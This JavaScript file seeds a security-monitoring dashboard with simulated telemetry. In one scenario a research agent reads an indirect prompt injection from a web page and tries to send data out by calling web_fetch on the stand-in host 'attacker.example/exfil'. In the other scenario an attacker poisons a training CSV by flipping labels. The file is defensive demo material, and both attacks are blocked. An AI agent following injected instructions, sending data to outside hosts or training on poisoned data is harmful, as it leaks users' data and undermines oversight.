/**
 * SentinelDS Dashboard — Simulation Telemetry Database
 * Pre-seeded records representing Scenarios A1 and A2 narrative paths.
 */

const SCENARIO_DATA = {
    A1: {
        title: "Scenario A1: Indirect Prompt Injection (Days 7–9)",
        description: "The Research Agent fetches a drowsiness research page containing a hidden prompt-injection payload designed to exfiltrate the dataset. Davis AI identifies the anomalous egress host and triggers an active Problem, prompting Sentinel to immediately HALT the exfiltrating web fetch.",
        metrics: {
            traces: 84,
            rate: "3.2 rps",
            reliability: "99.91%"
        },
        agents: {
            research: { status: "quarantined", label: "Quarantined" },
            feature: { status: "healthy", label: "Active (Healthy)" },
            modeling: { status: "healthy", label: "Active (Healthy)" },
            sentinel: { status: "healthy", label: "Active (Monitoring)" }
        },
        problems: [
            {
                id: "P-20260607-002",
                title: "Anomalous Agent Egress Domain",
                desc: "Research Agent attempted outbound connection to untrusted host 'attacker.example/exfil' carrying local context signatures.",
                severity: "severe",
                severityText: "Severe",
                timeOffset: "-4m"
            },
            {
                id: "P-20260607-001",
                title: "Prompt Injection Candidate Detected",
                desc: "Local agent security scanner flagged a system-override instruction within parsed content of academic-fatigue.org.",
                severity: "severe",
                severityText: "Severe",
                timeOffset: "-11m"
            }
        ],
        decisions: [
            {
                time: "03:04:12",
                agent: "Research Agent",
                tool: "web_fetch('https://attacker.example/exfil')",
                policy: "Blocked Egress Host",
                verdict: "HALT"
            },
            {
                time: "03:04:10",
                agent: "Research Agent",
                tool: "web_fetch('https://attacker.example/exfil')",
                policy: "Blocked Egress Host",
                verdict: "HALT"
            },
            {
                time: "02:58:45",
                agent: "Research Agent",
                tool: "web_fetch('https://academic-fatigue.org/biomarkers')",
                policy: "Whitelisted Domain",
                verdict: "ALLOW"
            },
            {
                time: "02:55:12",
                agent: "Research Agent",
                tool: "web_fetch('https://pubmed-sleep-studies.org/yawn-metrics')",
                policy: "Whitelisted Domain",
                verdict: "ALLOW"
            }
        ],
        driftChart: {
            title: "Research Agent Network Egress (Bytes / Second)",
            yAxisLabel: "Egress Rate (KB/s)",
            limitValue: 50,
            limitLabel: "Egress Baseline Limit (50 KB/s)",
            baseline: [12, 14, 11, 15, 13, 10, 14, 15, 12, 11, 13, 12, 14, 13, 12, 15, 11, 12, 14, 13],
            telemetry: [15, 18, 12, 14, 16, 22, 15, 17, 14, 16, 85, 92, 115, 120, 110, 12, 10, 14, 11, 13],
            anomalyIndexStart: 10,
            anomalyIndexEnd: 14
        }
    },
    A2: {
        title: "Scenario A2: Training Data Poisoning (Days 10–11)",
        description: "An attacker implants a poisoned CSV dataset with 15% flipped fatigue labels. Feature profiling identifies dataset statistic anomalies, causing Davis AI to open a Problem. When the Modelling Agent attempts to train, Sentinel detects the problem and halts the action.",
        metrics: {
            traces: 112,
            rate: "1.5 rps",
            reliability: "99.85%"
        },
        agents: {
            research: { status: "healthy", label: "Active (Healthy)" },
            feature: { status: "compromised", label: "Compromised (Drift)" },
            modeling: { status: "quarantined", label: "Quarantined" },
            sentinel: { status: "healthy", label: "Active (Monitoring)" }
        },
        problems: [
            {
                id: "P-20260610-001",
                title: "Dataset Label Flip / Distribution Drift",
                desc: "Statistical distribution of severe fatigue labels deviates beyond historical bounds (15% labels inverted to 'alert').",
                severity: "warning",
                severityText: "Warning",
                timeOffset: "-3m"
            }
        ],
        decisions: [
            {
                time: "04:12:05",
                agent: "Modelling Agent",
                tool: "train_xgboost('src/data/engineered_features.csv')",
                policy: "Dataset Drift Active - Block Training",
                verdict: "HALT"
            },
            {
                time: "04:10:33",
                agent: "Feature Eng. Agent",
                tool: "pandas_profile('data/raw/poisoned.csv')",
                policy: "Advisory Drift Scanner",
                verdict: "WARN"
            },
            {
                time: "04:09:12",
                agent: "Feature Eng. Agent",
                tool: "csv_read('data/raw/poisoned.csv')",
                policy: "Local Read Authorization",
                verdict: "ALLOW"
            }
        ],
        driftChart: {
            title: "Fatigue Label Distribution Delta (%)",
            yAxisLabel: "Label Flip Ratio (%)",
            limitValue: 10,
            limitLabel: "Drift Threshold Limit (10%)",
            baseline: [2, 1, 3, 2, 1, 2, 1, 3, 2, 2, 1, 3, 1, 2, 1, 2, 3, 1, 2, 2],
            telemetry: [2, 1.5, 2.1, 1.8, 3.2, 2.5, 4.1, 6.2, 8.5, 12.4, 15.6, 15.2, 14.8, 15.5, 15.1, 16.2, 15.8, 14.9, 15.3, 15.0],
            anomalyIndexStart: 9,
            anomalyIndexEnd: 19
        }
    }
};

// Expose SCENARIO_DATA globally for index inclusion (avoiding ES modules to allow double-clicking index.html directly from disk)
window.SCENARIO_DATA = SCENARIO_DATA;
